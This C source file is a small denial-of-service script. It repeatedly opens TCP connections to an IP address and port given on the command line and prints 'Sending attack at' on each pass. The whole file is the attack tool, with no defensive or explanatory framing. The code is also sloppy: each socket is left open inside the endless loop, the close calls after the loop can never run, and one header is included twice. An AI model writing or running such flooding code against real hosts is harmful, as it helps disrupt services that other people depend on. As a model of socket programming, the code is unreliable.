#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <stdbool.h>
#include <unistd.h>
#include <fcntl.h>

int main(int argc, char *argv[]){

	int mysocket;
	int conn;
	char *ip = argv[1];
	int port = atoi(argv[2]);
	
	while(true){
		struct sockaddr_in target;

		mysocket = socket(AF_INET,SOCK_STREAM,0);
		target.sin_family = AF_INET;
		target.sin_port = htons(port);
		target.sin_addr.s_addr = inet_addr(ip);
		conn = connect(mysocket, (struct sockaddr *)&target, sizeof target); 
	
		printf("Sending attack at %d \n",port);
	}

	close(mysocket);
	close(conn);

	return 0;
}	
